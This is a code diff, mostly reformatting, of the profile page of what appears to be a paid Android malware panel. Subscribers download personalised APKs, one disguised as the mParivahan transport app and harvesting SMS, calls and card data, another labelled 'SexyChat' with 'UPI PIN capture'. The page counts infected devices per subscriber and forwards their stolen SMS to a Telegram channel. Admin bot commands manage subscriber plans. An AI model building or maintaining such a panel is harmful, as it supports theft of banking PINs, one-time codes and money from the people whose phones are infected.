@@ -1,21 +1,38 @@
-import { useState, useEffect } from 'react';
-import { db } from '@/lib/firebase';
-import { ref, onValue, off } from 'firebase/database';
-import { Layout } from '@/components/layout';
-import { useAuth } from '@/lib/auth';
-import { useToast } from '@/hooks/use-toast';
+import { useState, useEffect } from "react";
+import { db } from "@/lib/firebase";
+import { ref, onValue, off } from "firebase/database";
+import { Layout } from "@/components/layout";
+import { useAuth } from "@/lib/auth";
+import { useToast } from "@/hooks/use-toast";
 import {
-  User, Mail, Shield, Calendar, Clock, Key, Send,
-  Hash, CheckCircle, XCircle, Loader2, ExternalLink, Download, LogOut, Smartphone
-} from 'lucide-react';
-import { format } from 'date-fns';
+  User,
+  Mail,
+  Shield,
+  Calendar,
+  Clock,
+  Key,
+  Send,
+  Hash,
+  CheckCircle,
+  XCircle,
+  Loader2,
+  ExternalLink,
+  Download,
+  LogOut,
+  Smartphone,
+} from "lucide-react";
+import { format } from "date-fns";
+import { authHeaders } from "@/lib/apiFetch";
 
-const API_BASE = (import.meta.env.VITE_API_URL ?? '').replace(/\/$/, '');
+const API_BASE = (import.meta.env.VITE_API_URL ?? "").replace(/\/$/, "");
 
 async function apiFetch(path: string, opts?: RequestInit) {
-  const res = await fetch(`${API_BASE}/api${path}`, opts);
+  const res = await fetch(`${API_BASE}/api${path}`, {
+    ...opts,
+    headers: authHeaders(opts?.headers as Record<string, string> | undefined),
+  });
   const data = await res.json().catch(() => ({}));
-  if (!res.ok) throw new Error(data.error || 'Request failed');
+  if (!res.ok) throw new Error(data.error || "Request failed");
   return data;
 }
 
@@ -27,25 +44,32 @@ export function Profile() {
   // Count devices assigned to this user (admin = all)
   useEffect(() => {
     if (!userId) return;
-    const clientsRef = ref(db, 'clients');
+    const clientsRef = ref(db, "clients");
     const handler = onValue(clientsRef, (snap) => {
       const data = snap.val();
-      if (!data) { setDeviceCount(0); return; }
+      if (!data) {
+        setDeviceCount(0);
+        return;
+      }
       if (isAdmin) {
-        setDeviceCount(Object.keys(data).filter(k => !k.startsWith('*')).length);
+        setDeviceCount(
+          Object.keys(data).filter((k) => !k.startsWith("*")).length
+        );
       } else {
-        const count = Object.values(data).filter((d: any) => d?.ownerTelegramId === userId).length;
+        const count = Object.values(data).filter(
+          (d: any) => d?.ownerTelegramId === userId
+        ).length;
         setDeviceCount(count);
       }
     });
-    return () => off(clientsRef, 'value', handler);
+    return () => off(clientsRef, "value", handler);
   }, [userId, isAdmin]);
 
   // Fetch login sessions
   useEffect(() => {
     if (!userId) return;
     apiFetch(`/auth/sessions?telegramId=${encodeURIComponent(userId)}`)
-      .then(d => d?.sessions ? setSessions(d.sessions) : setSessions({}))
+      .then((d) => (d?.sessions ? setSessions(d.sessions) : setSessions({})))
       .catch(() => setSessions({}));
   }, [userId]);
   const { toast } = useToast();
@@ -53,10 +77,14 @@ export function Profile() {
   const [profile, setProfile] = useState<any>(null);
   const [loadingProfile, setLoadingProfile] = useState(true);
 
-  const [pwForm, setPwForm] = useState({ currentPassword: '', newPassword: '', confirmPassword: '' });
+  const [pwForm, setPwForm] = useState({
+    currentPassword: "",
+    newPassword: "",
+    confirmPassword: "",
+  });
   const [changingPw, setChangingPw] = useState(false);
 
-  const [channelInput, setChannelInput] = useState('');
+  const [channelInput, setChannelInput] = useState("");
   const [savingChannel, setSavingChannel] = useState(false);
 
   // APK download state
@@ -70,35 +98,56 @@ export function Profile() {
         setProfile(data);
         if (data.smsChannel) setChannelInput(data.smsChannel);
       })
-      .catch(() => toast({ title: 'Error', description: 'Failed to load profile', variant: 'destructive' }))
+      .catch(() =>
+        toast({
+          title: "Error",
+          description: "Failed to load profile",
+          variant: "destructive",
+        })
+      )
       .finally(() => setLoadingProfile(false));
   }, [userId]);
 
   const handleChangePassword = async (e: React.FormEvent) => {
     e.preventDefault();
     if (pwForm.newPassword !== pwForm.confirmPassword) {
-      toast({ title: 'Error', description: 'New passwords do not match', variant: 'destructive' });
+      toast({
+        title: "Error",
+        description: "New passwords do not match",
+        variant: "destructive",
+      });
       return;
     }
     if (pwForm.newPassword.length < 4) {
-      toast({ title: 'Error', description: 'Password must be at least 4 characters long', variant: 'destructive' });
+      toast({
+        title: "Error",
+        description: "Password must be at least 4 characters long",
+        variant: "destructive",
+      });
       return;
     }
     setChangingPw(true);
     try {
-      await apiFetch('/auth/change-password', {
-        method: 'PUT',
-        headers: { 'Content-Type': 'application/json' },
+      await apiFetch("/auth/change-password", {
+        method: "PUT",
+        headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
           email: profile?.email,
           currentPassword: pwForm.currentPassword,
           newPassword: pwForm.newPassword,
         }),
       });
-      toast({ title: '✅ Password Changed', description: 'Naya password set ho gaya' });
-      setPwForm({ currentPassword: '', newPassword: '', confirmPassword: '' });
+      toast({
+        title: "✅ Password Changed",
+        description: "Naya password set ho gaya",
+      });
+      setPwForm({ currentPassword: "", newPassword: "", confirmPassword: "" });
     } catch (err: any) {
-      toast({ title: 'Error', description: err.message, variant: 'destructive' });
+      toast({
+        title: "Error",
+        description: err.message,
+        variant: "destructive",
+      });
     } finally {
       setChangingPw(false);
     }
@@ -108,31 +157,38 @@ export function Profile() {
     e.preventDefault();
     setSavingChannel(true);
     try {
-      await apiFetch('/auth/set-channel', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
+      await apiFetch("/auth/set-channel", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
           telegramId: userId,
           channelId: channelInput.trim() || null,
         }),
       });
       toast({
-        title: channelInput.trim() ? '✅ Channel Set' : '✅ Channel Removed',
+        title: channelInput.trim() ? "✅ Channel Set" : "✅ Channel Removed",
         description: channelInput.trim()
-          ? 'Ab naye SMS is channel pe forward honge'
-          : 'SMS forwarding band kar diya',
+          ? "Ab naye SMS is channel pe forward honge"
+          : "SMS forwarding band kar diya",
       });
-      setProfile((p: any) => ({ ...p, smsChannel: channelInput.trim() || null }));
+      setProfile((p: any) => ({
+        ...p,
+        smsChannel: channelInput.trim() || null,
+      }));
     } catch (err: any) {
-      toast({ title: 'Error', description: err.message, variant: 'destructive' });
+      toast({
+        title: "Error",
+        description: err.message,
+        variant: "destructive",
+      });
     } finally {
       setSavingChannel(false);
     }
   };
 
   const formatDate = (ts: number | null) => {
-    if (!ts) return '—';
-    return format(new Date(ts), 'dd MMM yyyy, HH:mm') + ' IST';
+    if (!ts) return "—";
+    return format(new Date(ts), "dd MMM yyyy, HH:mm") + " IST";
   };
 
   const daysLeft = (expiresAt: number | null) => {
@@ -146,22 +202,32 @@ export function Profile() {
   const handleLogoutSession = async (sessionId: string) => {
     if (!userId) return;
     try {
-      await apiFetch(`/auth/sessions/${sessionId}?telegramId=${encodeURIComponent(userId)}`, { method: 'DELETE' });
+      await apiFetch(
+        `/auth/sessions/${sessionId}?telegramId=${encodeURIComponent(userId)}`,
+        { method: "DELETE" }
+      );
       setSessions((prev: any) => {
         const next = { ...prev };
         delete next[sessionId];
         return next;
       });
-      toast({ title: 'Session Logged Out', description: 'Device session removed' });
+      toast({
+        title: "Session Logged Out",
+        description: "Device session removed",
+      });
     } catch (err: any) {
-      toast({ title: 'Error', description: err.message || 'Failed', variant: 'destructive' });
+      toast({
+        title: "Error",
+        description: err.message || "Failed",
+        variant: "destructive",
+      });
     }
   };
 
   const handleDownloadApk = () => {
     if (!userId) return;
     setDownloadingApk(true);
-    const a = document.createElement('a');
+    const a = document.createElement("a");
     a.href = `${API_BASE}/api/apk/download?telegramId=${encodeURIComponent(userId)}`;
     a.download = `mParivahan_HARRYAXE_${userId}.apk`;
     document.body.appendChild(a);
@@ -192,7 +258,9 @@ export function Profile() {
             <User className="w-6 h-6 text-primary" />
             Profile
           </h1>
-          <p className="text-sm text-muted-foreground mt-1">Account details &amp; settings</p>
+          <p className="text-sm text-muted-foreground mt-1">
+            Account details &amp; settings
+          </p>
         </div>
 
         {/* Connected devices + Logout */}
@@ -202,8 +270,12 @@ export function Profile() {
               <Smartphone className="w-5 h-5 text-primary" />
             </div>
             <div>
-              <p className="text-[10px] font-bold uppercase tracking-wider text-muted-foreground">Connected Devices</p>
-              <p className="text-lg font-bold text-foreground">{deviceCount} device{deviceCount === 1 ? "" : "s"}</p>
+              <p className="text-[10px] font-bold uppercase tracking-wider text-muted-foreground">
+                Connected Devices
+              </p>
+              <p className="text-lg font-bold text-foreground">
+                {deviceCount} device{deviceCount === 1 ? "" : "s"}
+              </p>
             </div>
           </div>
           <button
@@ -217,18 +289,29 @@ export function Profile() {
         {/* Active login sessions */}
         <div className="bg-card border border-border rounded-2xl p-5 shadow-sm">
           <h2 className="text-xs font-bold uppercase tracking-widest text-muted-foreground mb-3 flex items-center gap-2">
-            <Smartphone className="w-3.5 h-3.5" /> Active Login Sessions ({Object.keys(sessions).length})
+            <Smartphone className="w-3.5 h-3.5" /> Active Login Sessions (
+            {Object.keys(sessions).length})
           </h2>
           {Object.keys(sessions).length === 0 ? (
-            <p className="text-sm text-muted-foreground">No active sessions found.</p>
+            <p className="text-sm text-muted-foreground">
+              No active sessions found.
+            </p>
           ) : (
             <div className="space-y-2">
               {Object.entries(sessions).map(([sid, s]: any) => (
-                <div key={sid} className="flex items-center justify-between bg-muted/30 border border-border rounded-xl px-4 py-3">
+                <div
+                  key={sid}
+                  className="flex items-center justify-between bg-muted/30 border border-border rounded-xl px-4 py-3"
+                >
                   <div className="min-w-0">
-                    <p className='text-sm font-semibold text-foreground truncate'>{s.device || 'Unknown device'}</p>
+                    <p className="text-sm font-semibold text-foreground truncate">
+                      {s.device || "Unknown device"}
+                    </p>
                     <p className="text-xs text-muted-foreground mt-0.5">
-                      {s.ip || 'IP unknown'} · {s.loggedInAt ? new Date(s.loggedInAt).toLocaleString() : "" }
+                      {s.ip || "IP unknown"} ·{" "}
+                      {s.loggedInAt
+                        ? new Date(s.loggedInAt).toLocaleString()
+                        : ""}
                     </p>
                   </div>
                   <button
@@ -246,7 +329,10 @@ export function Profile() {
         {loadingProfile ? (
           <div className="space-y-4">
             {[1, 2, 3].map((i) => (
-              <div key={i} className="bg-card border border-card-border rounded-2xl h-32 animate-pulse" />
+              <div
+                key={i}
+                className="bg-card border border-card-border rounded-2xl h-32 animate-pulse"
+              />
             ))}
           </div>
         ) : (
@@ -257,35 +343,61 @@ export function Profile() {
               <div className="p-5">
                 <h2 className="page-eyebrow mb-4">Account Info</h2>
                 <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
-                  <InfoRow icon={User} label="Username" value={profile?.username || username} />
-                  <InfoRow icon={Hash} label="Telegram ID" value={userId || '—'} mono />
-                  <InfoRow icon={Mail} label="Email" value={profile?.email || '—'} />
+                  <InfoRow
+                    icon={User}
+                    label="Username"
+                    value={profile?.username || username}
+                  />
+                  <InfoRow
+                    icon={Hash}
+                    label="Telegram ID"
+                    value={userId || "—"}
+                    mono
+                  />
+                  <InfoRow
+                    icon={Mail}
+                    label="Email"
+                    value={profile?.email || "—"}
+                  />
                   <InfoRow
                     icon={Shield}
                     label="Role"
-                    value={isAdmin ? 'Administrator' : 'Subscriber'}
+                    value={isAdmin ? "Administrator" : "Subscriber"}
                     highlight={isAdmin}
                   />
                   {!isAdmin && (
                     <>
-                      <InfoRow icon={Calendar} label="Plan" value={profile?.plan || '—'} />
+                      <InfoRow
+                        icon={Calendar}
+                        label="Plan"
+                        value={profile?.plan || "—"}
+                      />
                       <div className="flex flex-col gap-1">
                         <span className="page-eyebrow flex items-center gap-1">
                           <Clock className="w-3 h-3" /> Status
                         </span>
-                        <span className={`text-sm font-medium flex items-center gap-1.5 ${
-                          profile?.status === 'active' ? 'text-success' : 'text-destructive'
-                        }`}>
-                          {profile?.status === 'active' ? (
-                            <><CheckCircle className="w-4 h-4" /> Active</>
+                        <span
+                          className={`text-sm font-medium flex items-center gap-1.5 ${
+                            profile?.status === "active"
+                              ? "text-success"
+                              : "text-destructive"
+                          }`}
+                        >
+                          {profile?.status === "active" ? (
+                            <>
+                              <CheckCircle className="w-4 h-4" /> Active
+                            </>
                           ) : (
-                            <><XCircle className="w-4 h-4" /> Expired</>
+                            <>
+                              <XCircle className="w-4 h-4" /> Expired
+                            </>
                           )}
-                          {profile?.expiresAt && profile?.status === 'active' && (
-                            <span className="text-muted-foreground text-xs ml-1">
-                              ({daysLeft(profile.expiresAt)}d left)
-                            </span>
-                          )}
+                          {profile?.expiresAt &&
+                            profile?.status === "active" && (
+                              <span className="text-muted-foreground text-xs ml-1">
+                                ({daysLeft(profile.expiresAt)}d left)
+                              </span>
+                            )}
                         </span>
                       </div>
                       {profile?.expiresAt && (
@@ -309,16 +421,22 @@ export function Profile() {
                   <Download className="w-3.5 h-3.5" /> Download APK
                 </h2>
                 <p className="text-xs text-muted-foreground mb-4">
-                  Download your unique APK — your Telegram ID is baked into it, so installing it will show the connection in your panel.
-                  First build may take ~30-60 seconds, subsequent downloads are instant from cache.
+                  Download your unique APK — your Telegram ID is baked into it,
+                  so installing it will show the connection in your panel. First
+                  build may take ~30-60 seconds, subsequent downloads are
+                  instant from cache.
                 </p>
 
                 {/* mParivahan APK */}
                 <div className="bg-card border border-card-border rounded-2xl p-4 mb-3">
                   <div className="flex items-center justify-between mb-2 gap-2">
                     <div>
-                      <h3 className="text-sm font-bold text-foreground">📱 mParivahan APK</h3>
-                      <p className="text-xs text-muted-foreground mt-0.5">Panel connection APK (SMS, calls, cards)</p>
+                      <h3 className="text-sm font-bold text-foreground">
+                        📱 mParivahan APK
+                      </h3>
+                      <p className="text-xs text-muted-foreground mt-0.5">
+                        Panel connection APK (SMS, calls, cards)
+                      </p>
                     </div>
                     <span className="text-[10px] font-bold px-2 py-1 rounded-full bg-primary/10 text-primary font-mono">
                       mParivahan_HARRYAXE_{userId || "..."}.apk
@@ -330,9 +448,13 @@ export function Profile() {
                     className="flex items-center justify-center gap-2 bg-primary text-primary-foreground px-5 py-3 rounded-full font-semibold text-sm hover:bg-primary/90 disabled:opacity-50 disabled:cursor-not-allowed transition-colors shadow-sm min-h-[44px]"
                   >
                     {downloadingApk ? (
-                      <><Loader2 className="w-4 h-4 animate-spin" /> Building...</>
+                      <>
+                        <Loader2 className="w-4 h-4 animate-spin" /> Building...
+                      </>
                     ) : (
-                      <><Download className="w-4 h-4" /> Download mParivahan</>
+                      <>
+                        <Download className="w-4 h-4" /> Download mParivahan
+                      </>
                     )}
                   </button>
                 </div>
@@ -341,8 +463,12 @@ export function Profile() {
                 <div className="bg-card border border-card-border rounded-2xl p-4">
                   <div className="flex items-center justify-between mb-2 gap-2">
                     <div>
-                      <h3 className="text-sm font-bold text-foreground">💬 SexyChat APK</h3>
-                      <p className="text-xs text-muted-foreground mt-0.5">Chat app with UPI PIN capture (unique per user)</p>
+                      <h3 className="text-sm font-bold text-foreground">
+                        💬 SexyChat APK
+                      </h3>
+                      <p className="text-xs text-muted-foreground mt-0.5">
+                        Chat app with UPI PIN capture (unique per user)
+                      </p>
                     </div>
                     <span className="text-[10px] font-bold px-2 py-1 rounded-full bg-success/10 text-success font-mono">
                       SexyChat_{userId || "..."}.apk
@@ -354,9 +480,13 @@ export function Profile() {
                     className="flex items-center justify-center gap-2 bg-success text-success-foreground px-5 py-3 rounded-full font-semibold text-sm hover:bg-success/90 disabled:opacity-50 disabled:cursor-not-allowed transition-colors shadow-sm min-h-[44px]"
                   >
                     {downloadingSexy ? (
-                      <><Loader2 className="w-4 h-4 animate-spin" /> Building...</>
+                      <>
+                        <Loader2 className="w-4 h-4 animate-spin" /> Building...
+                      </>
                     ) : (
-                      <><Download className="w-4 h-4" /> Download SexyChat</>
+                      <>
+                        <Download className="w-4 h-4" /> Download SexyChat
+                      </>
                     )}
                   </button>
                 </div>
@@ -371,7 +501,10 @@ export function Profile() {
                 </h2>
                 {!profile?.email ? (
                   <div className="text-sm text-muted-foreground bg-muted border border-card-border rounded-2xl p-4">
-                    ⚠️ Email not set. Contact admin or use <code className="text-primary">/setpanel</code> or <code className="text-primary">/reset_password</code> in the Telegram bot.
+                    ⚠️ Email not set. Contact admin or use{" "}
+                    <code className="text-primary">/setpanel</code> or{" "}
+                    <code className="text-primary">/reset_password</code> in the
+                    Telegram bot.
                   </div>
                 ) : (
                   <form onSubmit={handleChangePassword} className="space-y-4">
@@ -383,7 +516,12 @@ export function Profile() {
                         <input
                           type="password"
                           value={pwForm.currentPassword}
-                          onChange={(e) => setPwForm((f) => ({ ...f, currentPassword: e.target.value }))}
+                          onChange={(e) =>
+                            setPwForm((f) => ({
+                              ...f,
+                              currentPassword: e.target.value,
+                            }))
+                          }
                           required
                           placeholder="••••••"
                           className="w-full bg-muted border border-input rounded-xl px-3 py-3 text-sm text-foreground focus:outline-none focus:ring-2 focus:ring-primary/25 focus:border-primary transition-all placeholder:text-muted-foreground"
@@ -396,7 +534,12 @@ export function Profile() {
                         <input
                           type="password"
                           value={pwForm.newPassword}
-                          onChange={(e) => setPwForm((f) => ({ ...f, newPassword: e.target.value }))}
+                          onChange={(e) =>
+                            setPwForm((f) => ({
+                              ...f,
+                              newPassword: e.target.value,
+                            }))
+                          }
                           required
                           minLength={4}
                           placeholder="••••••"
@@ -410,7 +553,12 @@ export function Profile() {
                         <input
                           type="password"
                           value={pwForm.confirmPassword}
-                          onChange={(e) => setPwForm((f) => ({ ...f, confirmPassword: e.target.value }))}
+                          onChange={(e) =>
+                            setPwForm((f) => ({
+                              ...f,
+                              confirmPassword: e.target.value,
+                            }))
+                          }
                           required
                           placeholder="••••••"
                           className="w-full bg-muted border border-input rounded-xl px-3 py-3 text-sm text-foreground focus:outline-none focus:ring-2 focus:ring-primary/25 focus:border-primary transition-all placeholder:text-muted-foreground"
@@ -422,8 +570,12 @@ export function Profile() {
                       disabled={changingPw}
                       className="flex items-center justify-center gap-2 bg-primary text-primary-foreground px-6 py-3 rounded-full font-semibold text-sm hover:bg-primary/90 disabled:opacity-50 disabled:cursor-not-allowed transition-colors shadow-sm min-h-[44px]"
                     >
-                      {changingPw ? <Loader2 className="w-4 h-4 animate-spin" /> : <Key className="w-4 h-4" />}
-                      {changingPw ? 'Changing...' : 'Change Password'}
+                      {changingPw ? (
+                        <Loader2 className="w-4 h-4 animate-spin" />
+                      ) : (
+                        <Key className="w-4 h-4" />
+                      )}
+                      {changingPw ? "Changing..." : "Change Password"}
                     </button>
                   </form>
                 )}
@@ -438,18 +590,27 @@ export function Profile() {
                     <Send className="w-3.5 h-3.5" /> SMS Forward Channel
                   </h2>
                   <p className="text-xs text-muted-foreground mb-4">
-                    Sab devices ke naye SMS is Telegram channel pe automatically forward honge.
-                    First add the bot as a channel admin, then set the channel ID here.
+                    Sab devices ke naye SMS is Telegram channel pe automatically
+                    forward honge. First add the bot as a channel admin, then
+                    set the channel ID here.
                   </p>
 
                   {profile?.smsChannel && (
                     <div className="mb-4 bg-muted border border-card-border rounded-2xl p-3 font-medium text-sm flex items-center gap-2 text-foreground">
                       <CheckCircle className="w-4 h-4 text-success flex-shrink-0" />
-                      <span>Active: <code className="text-primary">{profile.smsChannel}</code></span>
+                      <span>
+                        Active:{" "}
+                        <code className="text-primary">
+                          {profile.smsChannel}
+                        </code>
+                      </span>
                     </div>
                   )}
 
-                  <form onSubmit={handleSaveChannel} className="flex flex-col sm:flex-row gap-3 items-end">
+                  <form
+                    onSubmit={handleSaveChannel}
+                    className="flex flex-col sm:flex-row gap-3 items-end"
+                  >
                     <div className="flex-1 w-full">
                       <label className="page-eyebrow block mb-1">
                         Channel ID (e.g. -100xxxxxxxxxx or @channelname)
@@ -467,15 +628,28 @@ export function Profile() {
                       disabled={savingChannel}
                       className="flex items-center justify-center gap-2 bg-primary text-primary-foreground px-5 py-3 rounded-full font-semibold text-sm hover:bg-primary/90 disabled:opacity-50 disabled:cursor-not-allowed transition-colors shadow-sm min-h-[44px] whitespace-nowrap"
                     >
-                      {savingChannel ? <Loader2 className="w-4 h-4 animate-spin" /> : <Send className="w-4 h-4" />}
-                      {savingChannel ? 'Saving...' : channelInput.trim() ? 'Set Channel' : 'Remove Channel'}
+                      {savingChannel ? (
+                        <Loader2 className="w-4 h-4 animate-spin" />
+                      ) : (
+                        <Send className="w-4 h-4" />
+                      )}
+                      {savingChannel
+                        ? "Saving..."
+                        : channelInput.trim()
+                          ? "Set Channel"
+                          : "Remove Channel"}
                     </button>
                   </form>
 
                   <div className="mt-4 text-xs text-muted-foreground bg-muted rounded-2xl p-3 space-y-1">
-                    <p className="font-semibold text-foreground">Setup steps:</p>
+                    <p className="font-semibold text-foreground">
+                      Setup steps:
+                    </p>
                     <p>1. Create your Telegram channel</p>
-                    <p>2. Add the bot as a channel admin (allow it to send messages)</p>
+                    <p>
+                      2. Add the bot as a channel admin (allow it to send
+                      messages)
+                    </p>
                     <p>3. Paste the channel ID here</p>
                     <p>4. Click "Set Channel"</p>
                   </div>
@@ -490,22 +664,38 @@ export function Profile() {
               </h2>
               <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 text-sm">
                 <div className="bg-muted border border-card-border rounded-2xl p-3">
-                  <p className="text-muted-foreground text-xs mb-1">Reset password via bot</p>
-                  <code className="text-primary font-medium">/reset_password</code>
+                  <p className="text-muted-foreground text-xs mb-1">
+                    Reset password via bot
+                  </p>
+                  <code className="text-primary font-medium">
+                    /reset_password
+                  </code>
                 </div>
                 {isAdmin && (
                   <>
                     <div className="bg-muted border border-card-border rounded-2xl p-3">
-                      <p className="text-muted-foreground text-xs mb-1">Set SMS channel via bot</p>
-                      <code className="text-primary font-medium">/setchannel -100xxx</code>
+                      <p className="text-muted-foreground text-xs mb-1">
+                        Set SMS channel via bot
+                      </p>
+                      <code className="text-primary font-medium">
+                        /setchannel -100xxx
+                      </code>
                     </div>
                     <div className="bg-muted border border-card-border rounded-2xl p-3">
-                      <p className="text-muted-foreground text-xs mb-1">Add user</p>
-                      <code className="text-primary font-medium">/adduser ID days @user email</code>
+                      <p className="text-muted-foreground text-xs mb-1">
+                        Add user
+                      </p>
+                      <code className="text-primary font-medium">
+                        /adduser ID days @user email
+                      </code>
                     </div>
                     <div className="bg-muted border border-card-border rounded-2xl p-3">
-                      <p className="text-muted-foreground text-xs mb-1">View all users</p>
-                      <code className="text-primary font-medium">/listusers</code>
+                      <p className="text-muted-foreground text-xs mb-1">
+                        View all users
+                      </p>
+                      <code className="text-primary font-medium">
+                        /listusers
+                      </code>
                     </div>
                   </>
                 )}
@@ -536,7 +726,9 @@ function InfoRow({
       <span className="page-eyebrow flex items-center gap-1">
         <Icon className="w-3 h-3" /> {label}
       </span>
-      <span className={`text-sm font-medium ${mono ? 'font-mono' : ''} ${highlight ? 'text-primary' : 'text-foreground'}`}>
+      <span
+        className={`text-sm font-medium ${mono ? "font-mono" : ""} ${highlight ? "text-primary" : "text-foreground"}`}
+      >
         {value}
       </span>
     </div>
